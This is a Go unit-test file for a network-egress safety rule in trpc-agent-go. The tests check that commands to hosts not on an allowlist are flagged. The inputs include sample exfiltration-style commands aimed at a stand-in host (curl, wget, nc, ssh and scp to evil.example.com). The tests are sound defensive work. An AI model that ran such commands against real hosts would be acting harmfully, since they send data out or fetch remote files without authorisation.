//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"context"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestNetworkEgress_CurlDomain verifies that curl to a non-whitelisted domain is detected.
func TestNetworkEgress_CurlDomain(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "curl http://evil.example.com/data",
	}, policy)

	assert.NotEmpty(t, findings)
	assert.Equal(t, "R-NET-001", findings[0].RuleID)
	assert.Contains(t, findings[0].Evidence, "evil.example.com")
}

// TestNetworkEgress_CurlDomain_Allowed verifies that curl to a whitelisted domain passes.
func TestNetworkEgress_CurlDomain_Allowed(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "curl http://api.trusted.com/health",
	}, policy)

	assert.Empty(t, findings, "no findings for whitelisted domain")
}

// TestNetworkEgress_WgetDomain verifies that wget to a non-whitelisted domain is detected.
func TestNetworkEgress_WgetDomain(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "wget http://evil.example.com/file.tar.gz",
	}, policy)

	assert.NotEmpty(t, findings)
	assert.Equal(t, "R-NET-001", findings[0].RuleID)
}

// TestNetworkEgress_SSHHost verifies that ssh to a non-whitelisted host is detected.
func TestNetworkEgress_SSHHost(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"git.internal.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "ssh user@evil.example.com",
	}, policy)

	assert.NotEmpty(t, findings)
	assert.Equal(t, "R-NET-001", findings[0].RuleID)
	assert.Contains(t, findings[0].Evidence, "evil.example.com")
}

// TestNetworkEgress_SSHHost_Allowed verifies that ssh to a whitelisted host passes.
func TestNetworkEgress_SSHHost_Allowed(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"git.internal.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "ssh user@git.internal.com",
	}, policy)

	assert.Empty(t, findings, "no findings for whitelisted SSH host")
}

// TestNetworkEgress_PythonHTTPClient verifies detection of Python HTTP calls in code blocks.
func TestNetworkEgress_PythonHTTPClient(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		CodeBlocks: []string{"import requests\nrequests.get('http://example.com')"},
	}, policy)

	assert.NotEmpty(t, findings)
	assert.Equal(t, "R-NET-001", findings[0].RuleID)
}

// TestNetworkEgress_PythonHTTPClient_Allowed verifies Python HTTP calls always produce a finding.
func TestNetworkEgress_PythonHTTPClient_Allowed(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		CodeBlocks: []string{"import urllib.request\nurllib.request.urlopen('http://api.trusted.com')"},
	}, policy)

	// Python HTTP client always produces a direct deny finding regardless of allowlist,
	// since the destination cannot be determined from static analysis.
	assert.NotEmpty(t, findings, "Python HTTP client should always produce a finding")
	assert.Equal(t, "R-NET-001", findings[0].RuleID)
}

// TestNetworkEgress_WildcardAllowlist verifies that wildcard subdomain matching works.
func TestNetworkEgress_WildcardAllowlist(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"*.example.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "curl http://sub.example.com/health",
	}, policy)

	assert.Empty(t, findings, "wildcard *.example.com should match sub.example.com")
}

// TestNetworkEgress_WildcardAllowlist_NoMatch verifies that wildcard doesn't match the base domain.
func TestNetworkEgress_WildcardAllowlist_NoMatch(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"*.example.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "curl http://example.com/health",
	}, policy)

	// *.example.com does not match example.com itself.
	assert.NotEmpty(t, findings, "wildcard should not match base domain")
}

// TestNetworkEgress_EmptyAllowlist verifies that empty allowlist denies all.
func TestNetworkEgress_EmptyAllowlist(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "curl http://any.domain.com/path",
	}, policy)

	assert.NotEmpty(t, findings)
}

// TestNetworkEgress_NoNetworkCommand verifies no findings when command has no network access.
func TestNetworkEgress_NoNetworkCommand(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "go test ./...",
	}, policy)

	assert.Empty(t, findings)
}

// TestNetworkEgress_NetcatDirect verifies that netcat implies network access.
func TestNetworkEgress_NetcatDirect(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "nc evil.example.com 443",
	}, policy)

	assert.NotEmpty(t, findings)
	assert.Equal(t, "R-NET-001", findings[0].RuleID)
}

// TestNetworkEgress_CurlMultipleURLs verifies that all domains in curl are checked.
func TestNetworkEgress_CurlMultipleURLs(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"api.trusted.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "curl http://api.trusted.com/health && curl http://evil.example.com/data",
	}, policy)

	// At least one finding for the non-whitelisted domain.
	found := false
	for _, f := range findings {
		if f.RuleID == "R-NET-001" && strings.Contains(f.Evidence, "evil.example.com") {
			found = true
		}
	}
	assert.True(t, found, "should find non-whitelisted domain")
}

// TestNetworkEgress_CurlSCPHost verifies extraction from scp command.
func TestNetworkEgress_CurlSCPHost(t *testing.T) {
	rule := &NetworkEgressRule{}
	policy := PolicyFile{
		NetworkAllowlist: []string{"git.internal.com"},
	}

	findings := rule.Scan(context.Background(), ScanInput{
		Command: "scp user@evil.example.com:/tmp/file .",
	}, policy)

	assert.NotEmpty(t, findings)
	assert.Contains(t, findings[0].Evidence, "evil.example.com")
}

// TestDomainMatchesAllowlist tests the domainMatchesAllowlist helper.
func TestDomainMatchesAllowlist(t *testing.T) {
	tests := []struct {
		name      string
		domain    string
		allowlist []string
		expected  bool
	}{
		{
			name:      "exact match",
			domain:    "api.trusted.com",
			allowlist: []string{"api.trusted.com"},
			expected:  true,
		},
		{
			name:      "no match",
			domain:    "evil.example.com",
			allowlist: []string{"api.trusted.com"},
			expected:  false,
		},
		{
			name:      "wildcard subdomain match",
			domain:    "sub.example.com",
			allowlist: []string{"*.example.com"},
			expected:  true,
		},
		{
			name:      "wildcard no base match",
			domain:    "example.com",
			allowlist: []string{"*.example.com"},
			expected:  false,
		},
		{
			name:      "empty allowlist",
			domain:    "any.com",
			allowlist: []string{},
			expected:  false,
		},
		{
			name:      "case insensitive match",
			domain:    "API.TRUSTED.COM",
			allowlist: []string{"api.trusted.com"},
			expected:  true,
		},
		{
			name:      "deep subdomain wildcard match",
			domain:    "a.b.example.com",
			allowlist: []string{"*.example.com"},
			expected:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := domainMatchesAllowlist(tt.domain, tt.allowlist)
			assert.Equal(t, tt.expected, result)
		})
	}
}

// TestHostFromArg verifies the hostFromArg helper.
func TestHostFromArg(t *testing.T) {
	tests := []struct {
		name     string
		arg      string
		expected string
	}{
		{
			name:     "full URL",
			arg:      "http://example.com/path",
			expected: "example.com",
		},
		{
			name:     "https URL",
			arg:      "https://api.trusted.com/v1/data",
			expected: "api.trusted.com",
		},
		{
			name:     "host:port",
			arg:      "example.com:443",
			expected: "example.com",
		},
		{
			name:     "bare host",
			arg:      "example.com",
			expected: "example.com",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := hostFromArg(tt.arg)
			assert.Equal(t, tt.expected, result)
		})
	}
}

// TestExtractCurlHosts verifies extractCurlHosts handles curl arguments.
func TestExtractCurlHosts(t *testing.T) {
	tests := []struct {
		name     string
		args     []string
		expected []string
	}{
		{
			name:     "simple URL",
			args:     []string{"http://example.com/api"},
			expected: []string{"example.com"},
		},
		{
			name:     "URL with flags",
			args:     []string{"-s", "http://example.com/api"},
			expected: []string{"example.com"},
		},
		{
			name:     "resolve flag skips value and extracts host",
			args:     []string{"--resolve", "example.com:443:127.0.0.1", "http://example.com/api"},
			expected: []string{"example.com", "example.com"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			hosts := extractCurlHosts(tt.args)
			assert.Equal(t, tt.expected, hosts)
		})
	}
}

// TestExtractWgetHosts verifies extractWgetHosts handles wget arguments.
func TestExtractWgetHosts(t *testing.T) {
	hosts := extractWgetHosts([]string{"-q", "http://example.com/file"})
	assert.Equal(t, []string{"example.com"}, hosts)
}

// TestExtractSSHHosts verifies extractSSHHosts handles ssh arguments.
func TestExtractSSHHosts(t *testing.T) {
	hosts := extractSSHHosts([]string{"-p", "22", "user@host.example.com"})
	assert.Equal(t, []string{"host.example.com"}, hosts)
}

// TestParseUserHost verifies the parseUserHost helper.
func TestParseUserHost(t *testing.T) {
	tests := []struct {
		name       string
		input      string
		expected   string
		expectedOK bool
	}{
		{
			name:       "user@host",
			input:      "user@example.com",
			expected:   "example.com",
			expectedOK: true,
		},
		{
			name:       "user@host:path",
			input:      "user@example.com:/path/to/file",
			expected:   "example.com",
			expectedOK: true,
		},
		{
			name:       "no @ sign",
			input:      "example.com",
			expected:   "",
			expectedOK: false,
		},
		{
			name:       "empty after @",
			input:      "@",
			expected:   "",
			expectedOK: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			host, ok := parseUserHost(tt.input)
			assert.Equal(t, tt.expectedOK, ok)
			assert.Equal(t, tt.expected, host)
		})
	}
}
